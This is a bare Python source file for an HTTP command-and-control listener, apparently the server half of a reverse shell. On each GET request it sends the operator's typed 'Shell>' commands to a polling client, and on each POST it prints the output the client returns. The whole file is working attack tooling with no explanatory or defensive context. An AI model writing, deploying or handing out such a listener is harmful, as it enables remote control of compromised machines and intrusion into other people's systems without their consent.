import http.server
import os
import cgi

HOST_NAME = "192.168.0.1"
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        command = input("Shell>")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()